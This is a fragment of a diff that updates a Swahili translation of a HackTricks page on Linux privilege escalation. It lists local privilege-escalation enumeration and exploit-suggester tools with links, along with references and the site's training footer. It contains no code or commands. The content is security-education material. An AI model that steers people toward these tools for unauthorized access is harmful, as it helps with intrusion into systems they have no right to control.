+### **Zana bora ya kutafuta vektori za kupandisha hadhi za ndani za Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 
 **LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
 **Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
 **Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
 **Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
 **BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
-**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
+**Kernelpop:** Kuorodhesha udhaifu wa kernel ndani ya linux na MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
 **Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
 **Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
-**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
-**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)
+**EvilAbigail (ufikiaji wa kimwili):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
+**Kukusanya scripts zaidi**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)
 
-## Marejeo
+## Marejeleo
 
 * [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
 * [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
@@ -1438,20 +1439,20 @@ Kwa upande mwingine, `/etc/init` inahusishwa na **Upstart**, mfumo mpya zaidi wa
 * [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
 * [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
 * [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
-* [https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
+* [https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
 * [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
 
 {% hint style="success" %}
-Jifunze & zoezi Udukuzi wa AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Jifunze & zoezi Udukuzi wa GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Jifunze & fanya mazoezi ya AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze & fanya mazoezi ya GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 {% endhint %}
